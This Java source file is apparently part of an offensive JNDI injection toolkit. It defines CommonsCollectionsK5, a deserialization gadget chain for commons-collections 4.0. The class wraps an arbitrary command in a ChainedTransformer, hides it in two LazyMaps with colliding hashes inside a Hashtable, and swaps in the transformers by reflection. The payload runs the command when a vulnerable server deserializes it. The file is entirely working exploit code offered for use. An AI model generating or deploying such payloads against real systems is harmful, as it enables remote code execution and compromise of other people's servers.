package com.qi4l.jndi.gadgets;

import com.qi4l.jndi.gadgets.annotation.Dependencies;
import com.qi4l.jndi.gadgets.utils.Reflections;
import com.qi4l.jndi.gadgets.utils.cc.TransformerUtil;
import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.functors.ChainedTransformer;
import org.apache.commons.collections4.map.LazyMap;

import java.util.HashMap;
import java.util.Hashtable;
import java.util.Map;

@Dependencies({"commons-collections:commons-collections:4.0"})
public class CommonsCollectionsK5 implements ObjectPayload<Hashtable> {

    public Hashtable getObject(String command) throws Exception {

        final Transformer   transformerChain = new ChainedTransformer(new Transformer[]{});
        final Transformer[] transformers     = (Transformer[]) TransformerUtil.makeTransformer(command);
        Map                 innerMap1        = new HashMap();
        Map                 innerMap2        = new HashMap();

        // Creating two LazyMaps with colliding hashes, in order to force element comparison during readObject
        Map lazyMap1 = LazyMap.lazyMap(innerMap1, transformerChain);
        lazyMap1.put("yy", 1);

        Map lazyMap2 = LazyMap.lazyMap(innerMap2, transformerChain);
        lazyMap2.put("zZ", 1);

        // Use the colliding Maps as keys in Hashtable
        Hashtable hashtable = new Hashtable();
        hashtable.put(lazyMap1, 1);
        hashtable.put(lazyMap2, 2);

        Reflections.setFieldValue(transformerChain, "iTransformers", transformers);

        // Needed to ensure hash collision after previous manipulations
        lazyMap2.remove("yy");

        return hashtable;
    }
}
